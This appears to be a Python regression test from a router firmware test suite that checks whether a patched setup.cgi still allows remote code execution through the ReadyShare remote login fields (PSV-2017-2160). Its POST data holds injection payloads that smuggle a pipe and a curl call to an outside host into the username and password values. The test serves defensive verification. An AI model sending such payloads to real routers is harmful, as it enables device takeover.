''' [PSV-2017-2160]RCE at setup.cgi (Username&Password) (todo=save&this_file=Readyshare_remote_answer.htm)  '''
''' anthor Cloud 2018-01-04'''
'''v1.0 '''
from API._API import *

# #def test_step_0():
    # #log.info( 'step-0-0 dut loaddrfault wait 160s')
    # #aploaddefault()
    # #log.info( "step-0-1 AP Genie over leap done")
    # #Genie_overleap()
#    log.info( "step-0-2 disable changed-url token")
#    Disable_changedToken()

def test_Step_1():
    log.info('step-1 Allow filename extension by pass auth, such as .xml, .js.jpg')
    if console_type == 'cable':
        print 'This case NA'
        case = 'fail'
        assert case == 'pass', "This action should not  work." 
    else:
        url = host + urlLogs
        token = getIDToken(url)
        Authorization = 'Basic ' + base64.b64encode(user + ':' + passwd) 
        headers = {'Authorization': Authorization}
        data = 'readyshare_remote_login_gui=%27%7Ccurl+http%3A%2F%2Fblum.ga%2Freadyclouduser%7C%27&readyshare_remote_password_gui=%27%7Ccurl+http%3A%2F%2Fblum.ga%2Freadycloudpass%7C%27&is_unregister=0&todo=save&this_file=Readyshare_remote_answer.htm&next_file=Readyshare_remote_answer.htm&need_change_wan_to_always=0'
        post_url = host + 'setup.cgi' + token
        r = requests.post(post_url, headers=headers, data=data,timeout=5)
        log.info(r.status_code)
        assert r.status_code == 404, "This action should not  work." 
